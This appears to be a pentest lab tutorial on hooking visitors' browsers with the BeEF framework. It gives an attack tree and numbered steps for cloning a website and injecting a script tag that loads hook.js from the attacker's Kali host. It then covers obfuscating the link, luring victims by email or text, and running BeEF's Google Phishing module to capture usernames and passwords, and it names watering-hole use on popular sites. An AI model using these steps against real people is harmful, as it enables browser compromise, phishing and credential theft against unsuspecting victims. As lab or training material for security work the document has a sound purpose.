# Webpage with BeEF hook

## Attack tree

```text
1 Test (AND)
    1.1 Create index.html with basic beef hook in /var/www/html/ (AND)
    1.2 Add basic beef hook script to it (AND)
    1.3 Start apache2 server (AND)
    1.4 Start BeEF (AND)
    1.5 Go to URL with target machine (AND)
    1.6 Watch IP address and info appear in beef (AND)
2 Inject hook in a page (AND)
    2.1 Download site with webscrapbook (AND)
    2.2 Extract downloaded archive and rename for easier use (AND)
    2.3 Open a page (like index.html) (AND)
    2.4 Add BeEF hook in <head> tag (AND)
    2.5 Copy all code to apache2 webroot
3 Manipulate URL (AND)
    3.1 Shorten
    3.2 QR code
    3.3 Obfuscate
4 Deliver link to target
```

## Example using BeEF

### Start BeEF

1. On Kali, run `ifconfig` in a terminal and record the IP address.
2. To run BeEF on Kali:

```text
cd /usr/share/beef-xss
./beef
```

BeEF starts after a short time and displays the interfaces it is running on. For the interface that has 
the IP address of Kali, note the URLs of the Hook and the UI. The Hook is the malicious code you will call from a 
web page; the UI is the administrative console used by the attacker to control the victim's system.
3. On Kali, launch a web browser and navigate to the user interface (UI) URL noted.
4. Log on with the username of beef and the password of beef. There are no online browsers listed on the left side of 
the screen.

### Create the malicious site
5. On Kali, launch a new terminal window (leave BeEF running in its own terminal) and type:

```text
service apache2 start
```

After the Apache web server is started, use the folder list to navigate to the web page we wish to modify.
6. Navigate to Other Locations -> Computer -> var -> www -> html.
7. Right-click index.html and choose Open With Other Application.
8. Choose View All Applications and then highlight Text Editor.
9. Choose Select to open the web page in a text editor.
10. Once the file has opened, press Ctrl+A to highlight all the contents and
then press Del on the keyboard to delete the contents.
11. Type the following text in the file to create a web page:

```text
<html>
<head>
    <!-- Enter hook URL below, but before </head> -->
</head>
<body>
<h1>Welcome to Website</h1>
Welcome to our website. We have a number of services that can help you.
</body>
</html>
```

12. Add the hook

```text
<head>
    <!-- Enter hook URL below, but before </head> -->
    <script src="http://<IP_OF_Kali>:3000/hook.js" type="text/javascript"></script>
</head>
```

13. Save and close

### Trick victim(s) into visiting site

Use social engineering attacks such as sending an email with the link, sending a text message with the link, or 
placing a link on another web page.

14. From a different system in the lab, navigate to `http://<ip_of_kali>` to surf the
website (normally you would be a trickster here).
15. Switch back to Kali.
16. While the user is connected to the company site, go back to the BeEF UI site, and see the client connected on 
the left side of your screen (if not, refresh the page).
17. Click the Commands tab to see a list of commands you can send to the compromised system. In the Module Tree view 
all the different commands and exploits you can send to the visitor.
18. Expand Social Engineering and then select Google Phishing
19. Click the Execute button that appears on the right side of the screen. This causes a Google logon page to appear 
on the victim's system. When the user logs on, the victim's username and password are logged into the BeEF UI
console. If you want the user to be redirected to a specific web page after the user attempts to log on, you could 
put the URL in an XSS hook URL field.
20. Choose the command from the Module Results screen to see the username and password the user entered to log on to 
Google.

## Notes 

Just the basics for testing how it works in the lab. If placing the hook in a big popular website, it is called a 
watering hole attack.

## Tools

* [BeEF in Kali](https://www.kali.org/tools/beef-xss/)
* [WebScrapBook](https://addons.mozilla.org/en-GB/firefox/addon/webscrapbook/)
* [Domain obfuscator](https://splitline.github.io/domain-obfuscator/)